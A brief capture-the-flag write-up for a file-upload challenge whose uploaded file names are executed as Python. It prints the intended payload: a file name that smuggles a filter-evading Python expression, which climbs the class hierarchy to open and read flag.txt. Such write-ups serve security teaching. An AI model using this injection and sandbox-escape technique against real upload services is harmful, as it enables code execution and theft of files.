# TheMostSecureFileUploader

**Description** : Somehow the codes are all messed up and it seems that it was my younger brother. He messed up my File Uploader. But I know you...You dont look like a hacker at all...Can you fix this for me? :)
  
**Author**: [c3rb3ru5](https://twitter.com/__c3rb3ru5__)
  
**Short solution**: The file name of the file that was uploaded was found to be executed as a Python command. Then use python inbuilt functions and classes to read `flag.txt`. The intended solution was to upload a file with the file name as `print getattr(getattr(getattr('','__cla''ss__'),'__mr''o__')[2],'__subc''lasses__')()[40]('flag').read()#.png`.
